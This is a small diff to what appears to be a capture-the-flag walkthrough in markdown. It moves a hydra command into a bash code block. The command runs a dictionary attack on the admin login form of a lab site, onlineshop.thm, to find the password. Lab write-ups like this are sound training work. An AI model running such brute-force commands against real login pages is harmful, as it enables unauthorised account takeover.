@@ -52,7 +52,11 @@ Ethical hackers often find success by chaining multiple small weaknesses togethe
 
 **Using either manual testing or an automated dictionary attack, what password did you discover for the admin user?**
 
-Just run this script in terminal to find the password:  hydra -l admin -P passlist.txt <www.onlineshop.thm> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+Just run this script in terminal to find the password:  
+
+```bash
+hydra -l admin -P passlist.txt <www.onlineshop.thm> http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+```
 
 ![alt text](image-1.png)
 
